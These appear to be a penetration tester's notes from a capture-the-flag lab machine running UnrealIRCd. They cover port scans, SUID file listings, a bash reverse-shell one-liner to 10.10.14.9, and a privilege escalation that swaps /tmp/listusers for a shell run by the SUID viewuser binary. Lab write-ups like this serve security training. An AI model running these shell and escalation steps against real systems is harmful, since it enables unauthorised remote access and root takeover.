Notes.txt
IP: 10.10.10.117
OWN: 10.9.0.12


22/TCP - ssh - OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind 2-4 (RPC #100000)


Some mention of IRC on the HTTP page. I'm going to try connecting to 111

Connected but gave a 104 error?

NEEDED TO SCAN ALL PORTS
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-25 13:55 UTC
Nmap scan report for 10.10.10.117
Host is up (0.058s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
54251/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.67 second


Was able to exploit the machine using a Metasploit module for UnrealIRCd

Found this password in a .backup file??
Super elite steg backup pw
>>> UPupDOWNdownLRlrBAbaSSss
    AABBA AAABB BBAAB BAABB AABBA

    Maybe?

    G D Z T G
# Reverse shell
bash -i >& /dev/tcp/10.10.14.9/8080 0>&1

# Updates the shell to bash shell
echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py ; python /tmp/asdf.py

# PRIV ESC
cat /etc/issue --> Debian GNU/Linux 8

# Link version
cat /proc/version 

# Enviorment
env


# SUID and SGID are files that required elivated privileges to run

[-] SUID files:
-rwsr-xr-- 1 root messagebus 362672 Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 9468 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 13816 Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 562536 Nov 19  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 13564 Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
-rwsr-xr-x 1 root root 1085300 Feb 10  2018 /usr/sbin/exim4
-rwsr-xr-- 1 root dip 338948 Apr 14  2015 /usr/sbin/pppd
-rwsr-xr-x 1 root root 43576 May 17  2017 /usr/bin/chsh
-rwsr-sr-x 1 root mail 96192 Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 78072 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 38740 May 17  2017 /usr/bin/newgrp
-rwsr-sr-x 1 daemon daemon 50644 Sep 30  2014 /usr/bin/at
-rwsr-xr-x 1 root root 18072 Sep  8  2016 /usr/bin/pkexec
-rwsr-sr-x 1 root root 9468 Apr  1  2014 /usr/bin/X
-rwsr-xr-x 1 root root 53112 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 52344 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
-rwsr-xr-x 1 root root 96760 Aug 13  2014 /sbin/mount.nfs
-rwsr-xr-x 1 root root 38868 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 34684 Mar 29  2015 /bin/mount
-rwsr-xr-x 1 root root 34208 Jan 21  2016 /bin/fusermount
-rwsr-xr-x 1 root root 161584 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 26344 Mar 29  2015 /bin/umount


[-] SGID files:
-rwxr-sr-x 1 root mail 13680 Dec 24  2016 /usr/lib/evolution/camel-lock-helper-1.2
-rwxr-sr-x 1 root utmp 13992 Jun 23  2014 /usr/lib/libvte-2.90-9/gnome-pty-helper
-rwxr-sr-x 1 root utmp 13992 Dec  5  2014 /usr/lib/libvte-2.91-0/gnome-pty-helper
-rwxr-sr-x 1 root utmp 4972 Feb 21  2011 /usr/lib/utempter/utempter
-rwxr-sr-x 1 root tty 26240 Mar 29  2015 /usr/bin/wall
-rwxr-sr-x 1 root mail 17880 Nov 18  2017 /usr/bin/lockfile
-rwsr-sr-x 1 root mail 96192 Nov 18  2017 /usr/bin/procmail
-rwsr-sr-x 1 daemon daemon 50644 Sep 30  2014 /usr/bin/at
-rwxr-sr-x 1 root shadow 21964 May 17  2017 /usr/bin/expiry
-rwxr-sr-x 1 root tty 9680 Oct 17  2014 /usr/bin/bsd-write
-rwxr-sr-x 1 root mail 9772 Dec  4  2014 /usr/bin/mutt_dotlock
-rwxr-sr-x 1 root ssh 419192 Nov 19  2017 /usr/bin/ssh-agent
-rwxr-sr-x 1 root mail 13892 Jun  2  2013 /usr/bin/dotlockfile
-rwxr-sr-x 1 root crontab 38844 Jun  7  2015 /usr/bin/crontab
-rwsr-sr-x 1 root root 9468 Apr  1  2014 /usr/bin/X
-rwxr-sr-x 1 root mlocate 32116 Jun 13  2013 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 61232 May 17  2017 /usr/bin/chage
-rwxr-sr-x 1 root shadow 34424 May 27  2017 /sbin/unix_chkpwd


Found viewuser??
-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser

# viewuser executes a file called "listusers" found in the tmp directory
# by replacing that with a reverse shell you can gain root and own the system